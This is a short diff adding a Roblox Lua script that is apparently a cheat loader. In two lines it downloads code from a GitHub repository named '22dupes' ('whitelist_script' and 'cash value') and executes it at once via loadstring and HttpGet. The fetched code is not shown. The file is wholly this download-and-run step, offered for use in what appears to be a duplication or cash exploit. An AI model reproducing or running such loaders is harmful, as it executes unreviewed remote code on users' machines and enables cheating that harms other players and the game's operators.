@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/22kyasue/22dupes/master/whitelist_script", true))()
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/22kyasue/22dupes/master/cash%20value", true))()
